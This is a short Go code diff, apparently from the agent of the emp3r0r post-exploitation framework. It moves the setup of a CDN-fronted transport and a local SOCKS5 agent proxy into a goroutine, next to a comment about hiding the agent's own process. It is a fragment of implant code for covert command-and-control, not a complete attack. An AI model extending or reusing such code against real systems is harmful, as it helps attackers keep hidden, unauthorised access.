@@ -161,9 +161,9 @@ func main() {
 			if err != nil {
 				log.Fatal(err)
 			}
+			emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
+			emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 		}()
-		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", emp3r0r_data.CDNProxy)
-		emp3r0r_data.AgentProxy = "socks5://127.0.0.1:10888"
 	}
 
 	// hide process of itself if possible
